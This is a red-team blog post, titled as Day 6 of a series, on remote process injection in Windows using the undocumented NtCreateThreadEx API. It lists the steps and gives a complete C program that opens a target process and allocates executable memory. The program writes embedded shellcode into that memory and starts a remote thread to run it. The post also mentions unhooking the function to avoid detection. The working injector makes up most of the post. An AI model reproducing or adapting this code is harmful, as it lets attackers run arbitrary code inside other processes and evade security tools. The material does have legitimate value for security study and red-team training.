---
layout: post
title: "7 days of Red- Day 6"
date: 2021-3-19 18:40:20 -0400
categories: Writeup

---



```


███████╗    ██████╗  █████╗ ██╗   ██╗███████╗     ██████╗ ███████╗    ██████╗ ███████╗██████╗ 
╚════██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝    ██╔══██╗██╔════╝██╔══██╗
    ██╔╝    ██║  ██║███████║ ╚████╔╝ ███████╗    ██║   ██║█████╗      ██████╔╝█████╗  ██║  ██║
   ██╔╝     ██║  ██║██╔══██║  ╚██╔╝  ╚════██║    ██║   ██║██╔══╝      ██╔══██╗██╔══╝  ██║  ██║
   ██║      ██████╔╝██║  ██║   ██║   ███████║    ╚██████╔╝██║         ██║  ██║███████╗██████╔╝
   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝         ╚═╝  ╚═╝╚══════╝╚═════╝ 
                                                                                              
██████╗  █████╗ ██╗   ██╗    ███████╗                                                         
██╔══██╗██╔══██╗╚██╗ ██╔╝    ██╔════╝                                                         
██║  ██║███████║ ╚████╔╝     ███████╗                                                         
██║  ██║██╔══██║  ╚██╔╝      ╚════██║                                                         
██████╔╝██║  ██║   ██║       ███████║                                                         
╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚══════╝                                                         
                                                                                              


```



## Remote Process Injection via NtCreateThreadEx

### Day 5

Remote Process Injection is a method for operators to migrate to active processes in order to blend in to the target and execute arbitrary code. There are plenty of ways to do this, however in this blogpost we'll be using **`NtCreateThreadEx`** in order to start a new thread in the virtual address space of the remote process.**`NtCreateThreadEx`** is a undocumented Native API that resides in nt.dll which is the library where the Native API live. The more well known Windows API **`CreateRemoteThread`** actually calls this function behind the scenes before it enters the kernel. Still in order to use this technique in engagements  you may need to unhook this function in order to not have it get flagged. 

### Steps:

   1.Open Remote Process - OpenProcess()

   2.Allocate Memory in the Remote Process with PAGE_EXECUTE_READWRITE permissions-VirtualAllocEx()

​      * Allocating memory with PAGE_EXECUTE_READWRITE is bad opsec

   3.Write shellcode over to the newly allocated memory space - WriteProcessMemory()

   4.Start a New Thread pointing to the allocated memory space -NtCreateThreadEx()

```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI *NtCreateThreadEx)(HANDLE * pHandle, ACCESS_MASK DesiredAccess, void * pAttr, HANDLE hProc, void * pFunc, void * pArg, ULONG Flags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, void * pAttrListOut);



int main(int argc,char **argv){
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
"\x85\x08\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x53\x68\x65"
"\x6c\x6c\x63\x6f\x64\x65\x00\x53\x75\x63\x63\x65\x73\x73\x00";


HANDLE hthread=NULL;
DWORD pid = atoi(argv[1]);
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
VOID *payload= VirtualAllocEx(hProc,NULL,sizeof(shellcode),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc,payload,shellcode,sizeof(shellcode),NULL);
NtCreateThreadEx pNtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(LoadLibrary("ntdll.dll"),"NtCreateThreadEx");
pNtCreateThreadEx(&hthread,GENERIC_ALL,NULL,hProc,(LPTHREAD_START_ROUTINE)payload,NULL,FALSE,0,0,0,NULL);
return 0;
}

```

